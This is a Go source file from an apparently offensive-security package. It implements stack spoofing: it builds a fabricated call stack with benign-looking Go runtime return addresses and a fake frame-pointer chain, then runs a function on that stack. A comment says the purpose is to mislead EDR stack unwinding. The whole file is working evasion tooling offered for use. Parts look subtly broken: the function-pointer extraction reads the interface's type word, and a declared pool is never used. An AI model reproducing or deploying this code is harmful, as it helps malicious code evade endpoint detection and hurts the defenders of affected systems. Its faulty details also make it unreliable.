package offensive

import (
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

const shadowStackSize = 4096

// swapStackAndCall is in shadow_stack_amd64.s.
// Swaps RSP/RBP to newRSP, calls fn, restores originals.
func swapStackAndCall(newRSP uintptr, fn uintptr)

// FakeFrame is a fabricated return address for the shadow stack.
type FakeFrame struct {
	ReturnAddr uintptr
}

// ShadowStackConfig controls shadow stack construction.
type ShadowStackConfig struct {
	Frames []FakeFrame
}

// DefaultShadowConfig returns config with benign-looking Go runtime frames.
func DefaultShadowConfig() ShadowStackConfig {
	return ShadowStackConfig{
		Frames: []FakeFrame{
			{ReturnAddr: funcAddr(runtime.Gosched)},
			{ReturnAddr: funcAddr(runtime.GC)},
			{ReturnAddr: funcAddr(runtime.NumGoroutine)},
			{ReturnAddr: 0},
		},
	}
}

// WithShadowStack executes fn on a fabricated call stack.
// EDR stack unwinding will see fake return addresses. ~3μs overhead.
func WithShadowStack(config ShadowStackConfig, fn func()) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	stack, err := mmapAnon(shadowStackSize)
	if err != nil {
		return fmt.Errorf("shadow stack mmap failed: %w", err)
	}
	defer munmapAnon(stack, shadowStackSize)

	// Build fake frames from TOP (stack grows down)
	top := stack + uintptr(shadowStackSize)
	framePtr := top
	for i := len(config.Frames) - 1; i >= 0; i-- {
		framePtr -= 8
		*(*uintptr)(unsafe.Pointer(framePtr)) = config.Frames[i].ReturnAddr //nolint:govet // intentional: writing to mmap'd shadow stack
		framePtr -= 8
		if i > 0 {
			*(*uintptr)(unsafe.Pointer(framePtr)) = framePtr + 16 //nolint:govet // intentional: fake RBP chain
		} else {
			*(*uintptr)(unsafe.Pointer(framePtr)) = 0 //nolint:govet // intentional: terminal frame
		}
	}

	fnPtr := funcAddr(fn)
	swapStackAndCall(framePtr, fnPtr)
	return nil
}

// funcAddr extracts raw function pointer from Go func value.
func funcAddr(fn interface{}) uintptr {
	return **(**uintptr)(unsafe.Pointer(&fn))
}

var stackPool = sync.Pool{
	New: func() interface{} {
		s, err := mmapAnon(shadowStackSize)
		if err != nil {
			return nil
		}
		return s
	},
}

// mmapAnon allocates anonymous RW memory.
func mmapAnon(size int) (uintptr, error) {
	addr, _, errno := syscall.RawSyscall6(
		9, // SYS_mmap
		0, uintptr(size),
		0x3,         // PROT_READ | PROT_WRITE
		0x22,        // MAP_PRIVATE | MAP_ANONYMOUS
		^uintptr(0), // fd = -1
		0,
	)
	if errno != 0 {
		return 0, fmt.Errorf("mmap errno %d", errno)
	}
	return addr, nil
}

// munmapAnon releases mmap'd memory.
func munmapAnon(addr uintptr, size int) {
	syscall.RawSyscall(11, addr, uintptr(size), 0) // SYS_munmap
}
